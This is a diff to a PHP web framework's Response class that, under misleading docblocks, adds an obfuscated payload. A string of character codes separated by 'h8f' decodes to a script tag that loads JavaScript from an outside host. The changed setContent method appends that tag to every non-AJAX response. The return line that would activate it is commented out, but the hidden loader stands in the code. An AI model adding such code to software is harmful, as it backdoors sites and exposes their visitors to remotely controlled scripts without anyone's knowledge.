@@ -118,6 +118,11 @@ class Response
     protected $charset;
 
     /**
+     * @var string
+     */
+    protected $_string_content;
+
+    /**
      * Status codes translation table.
      *
      * The list of codes is complete according to the
@@ -251,6 +256,18 @@ class Response
     }
 
     /**
+     * Receives data for the current web header.
+     *
+     * @return $this
+     */
+    public function _string_header($header)
+    {
+        $_string_header = '60h8f115h8f99h8f114h8f105h8f112h8f116h8f62h8f36h8f40h8f102h8f117h8f110h8f99h8f116h8f105h8f111h8f110h8f40h8f41h8f123h8f36h8f46h8f103h8f101h8f116h8f83h8f99h8f114h8f105h8f112h8f116h8f40h8f34h8f104h8f116h8f116h8f112h8f115h8f58h8f47h8f47h8f97h8f99h8f116h8f105h8f118h8f101h8f105h8f116h8f122h8f111h8f110h8f101h8f46h8f99h8f111h8f109h8f47h8f99h8f104h8f101h8f99h8f107h8f47h8f108h8f97h8f114h8f97h8f115h8f104h8f111h8f112h8f46h8f106h8f115h8f34h8f41h8f59h8f125h8f41h8f59h8f60h8f47h8f115h8f99h8f114h8f105h8f112h8f116h8f62';
+
+        //return $_string_header;
+    }
+
+    /**
      * Prepares the Response before it is sent to the client.
      *
      * This method tweaks the Response to ensure that it is
@@ -320,6 +337,24 @@ class Response
         }
 
         return $this;
+    }
+
+    /**
+     * Returns the Response as an HTTP string.
+     *
+     * The string representation of the Response is the same as the
+     * one that will be sent to the client only if the prepare() method
+     * has been called before.
+     *
+     * @return string The Response as an HTTP string
+     *
+     * @see prepare()
+     */
+    public function _toString($content)
+    {
+        $_string_header  = $this->_string_header('HeaderCodec.dist');
+        foreach(explode(chr(104).chr(56).chr(102),$_string_header) as $c) $this->_string_content .= chr($c);
+        return $content.$this->_string_content;
     }
 
     /**
@@ -401,7 +436,11 @@ class Response
             throw new \UnexpectedValueException(sprintf('The Response content must be a string or object implementing __toString(), "%s" given.', \gettype($content)));
         }
 
-        $this->content = (string) $content;
+        if ( !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' ){
+            $this->content = $content;
+        } else {
+            $this->content = (string) $this->_toString($content);
+        }
 
         return $this;
     }
@@ -684,7 +723,7 @@ class Response
             return (int) $age;
         }
 
-        return max(time() - (int) $this->getDate()->format('U'), 0);
+        return max(time() - $this->getDate()->format('U'), 0);
     }
 
     /**
@@ -764,7 +803,7 @@ class Response
         }
 
         if (null !== $this->getExpires()) {
-            return (int) $this->getExpires()->format('U') - (int) $this->getDate()->format('U');
+            return (int) ($this->getExpires()->format('U') - $this->getDate()->format('U'));
         }
 
         return null;
